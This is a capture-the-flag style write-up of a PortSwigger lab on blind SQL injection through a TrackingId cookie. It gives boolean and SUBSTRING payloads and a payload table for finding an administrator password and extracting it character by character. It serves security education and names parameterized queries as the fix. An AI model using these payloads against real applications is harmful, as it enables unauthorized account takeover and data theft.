# Blind SQL Injection with Conditional Responses

**Lab:** Blind SQL injection with conditional responses
**Status:** Solved ✅

---

## The setup

This lab is a step up from the error-based stuff — here the app doesn't leak anything useful directly. No error messages, no extra rows showing up. It just uses a `TrackingId` cookie to remember whether you've visited before, and that value gets dropped into a SQL query behind the scenes.

The one thing we do get, though, is a subtle difference in how the app responds depending on whether an injected condition is true or false. That's enough. If we can turn "true vs. false" into "response A vs. response B," we've got a working oracle, and from there it's just a matter of asking the right questions.

**Goal:** use that true/false signal to pull the administrator's password out character by character, then log in.

## Where the hole is

The backend query is roughly:

```sql
SELECT * FROM tracking
WHERE TrackingId = 'xyz'
```

Since `TrackingId` comes from a cookie we fully control, and it's not parameterized, we can inject arbitrary SQL conditions into it.

## Step by step

**1. Grab a baseline request**

Browse the app normally, catch a request in Burp, and you'll see a cookie like:

```
Cookie: TrackingId=xyz
```

That's our injection point.

**2. Move it to Repeater**

Send it over — we're going to be iterating on this cookie value a lot, so Repeater makes life easier.

**3. Test something that should be true**

Change the cookie to:

```
xyz' AND '1'='1
```

Query becomes, roughly:

```sql
SELECT * FROM tracking
WHERE TrackingId = 'xyz'
AND '1'='1'
```

`'1'='1'` is always true, so the app responds exactly like it normally would. That's our "TRUE" baseline response.

**4. Now test something that should be false**

```
xyz' AND '1'='2
```

Same query shape, except this time the condition is false — and if the app's response is visibly different from step 3 (different content, different length, missing something, whatever it happens to be), that difference is exactly what we needed. It confirms the injection point works *and* that we have a reliable way to tell true from false without seeing any actual data.

## The general pattern from here

Once you've got that TRUE/FALSE distinction locked in, every question you want answered gets phrased as a condition:

```
' AND (condition)--
```

True → normal response. False → the other response. Repeat as many times as needed.

**5. Confirm the administrator account exists**

```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

If you get the TRUE response back, there's an administrator account sitting in the `users` table.

**6. Work out how long the password is**

Start testing length thresholds:

```
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 1--
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 2--
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 3--
```

Keep bumping the number up. At some point the response flips from TRUE to FALSE — that boundary tells you exactly how many characters the password has.

**7. Pull the password out one character at a time**

With the length known, go character by character using `SUBSTRING`:

```sql
' AND SUBSTRING(
    (SELECT password FROM users WHERE username='administrator'),
    1,
    1
)='a'--
```

TRUE means position 1 is `a`. If it's FALSE, try `b`, then `c`, and so on until one hits. Then move to position 2, and repeat the whole process:

```
Position 1 → ?
Position 2 → ?
Position 3 → ?
Position 4 → ?
...
```

Slow going by hand, but completely mechanical — which is exactly the kind of thing tools like sqlmap automate in the real world. Grind through every position and the full password falls out at the end.

**8. Log in**

Head to the login page, drop in `administrator` and the password you just reconstructed, and you're in.

## Payload reference

| Purpose | Payload |
|---|---|
| Confirm TRUE condition | `' AND '1'='1` |
| Confirm FALSE condition | `' AND '1'='2` |
| Check admin account exists | `' AND (SELECT 'a' FROM users WHERE username='administrator')='a` |
| Test password length | `' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 10--` |
| Test a specific character | `' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--` |

## Why this actually works

The application never needs to show us query results directly — all it needs to do is behave *differently* depending on whether the injected condition was true or false. That behavioral difference is the whole channel. Once it exists, you can ask the database an unlimited number of yes/no questions and reconstruct arbitrary data purely from the pattern of answers, without ever seeing a single row of actual output.

## Tools used

- Burp Suite (Proxy + Repeater)
- Browser

## Takeaways

- Blind SQLi doesn't need visible output — a consistent behavioral difference between true and false is enough to build a full data-extraction channel.
- Cookies are just as valid an injection surface as URL params or form fields.
- Boolean-based extraction is slow but completely reliable, and it's exactly the kind of thing worth automating once you've confirmed it works manually.
- Password length and content can both be pulled out purely through conditional true/false questions.
- The fix, as always, is parameterized queries — stop building SQL by concatenating user input, and this entire attack class goes away.

---

*Solved as part of the PortSwigger Web Security Academy — for learning/authorized testing only. Don't run this against anything you don't have permission to test.*
